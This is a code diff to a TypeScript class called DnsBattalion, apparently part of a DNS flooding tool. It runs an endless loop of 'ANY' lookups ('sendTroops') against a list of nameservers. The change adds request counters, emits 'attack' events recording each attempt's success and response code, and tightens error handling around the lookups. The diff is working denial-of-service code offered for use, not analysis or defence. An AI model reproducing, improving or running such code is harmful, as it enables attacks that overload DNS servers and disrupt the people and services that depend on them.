@@ -10,6 +10,8 @@ export class DnsBattalion {
   private readonly eventSource: EventEmitter
   private nameservers: NameserverData[]
   private active = false
+  private totalRequests = 0
+  private successfulRequest = 0
 
   constructor (nameservers: NameserverData[]) {
     this.nameservers = nameservers
@@ -26,8 +28,16 @@ export class DnsBattalion {
     console.log('battalion started')
     while (this.active) {
       try {
-        await this.sendTroops()
+        const responseCode = await this.sendTroops()
+        this.eventSource.emit('attack', {
+          successful: true,
+          code: responseCode
+        })
       } catch (error) {
+        this.eventSource.emit('attack', {
+          successful: false,
+          code: error
+        })
         console.log('Error:', error)
       }
     }
@@ -51,10 +61,16 @@ export class DnsBattalion {
       resolver.resolveAny(domainForLookup, (err, addresses) => {
         const lookupSeconds = ((new Date().getTime() - startTime) / 1000).toFixed(2)
         console.log(`Lookup time: ${lookupSeconds} sec. Domain: ${domainForLookup}. NS: ${nameserver.nameserverHost}. Err code:`, err?.code, 'Address:', addresses)
-        if (err?.code && DnsBattalion.isSuccessful(err.code)) {
-          resolve(err.code)
+        if (err?.code) {
+          if (DnsBattalion.isSuccessful(err.code)) {
+            resolve(err.code)
+          } else {
+            reject(err.code)
+          }
+          return
         } else if (!addresses) {
-          reject(err)
+          reject('UNKNOWN ERR')
+          return
         }
         resolve('FOUND')
       })
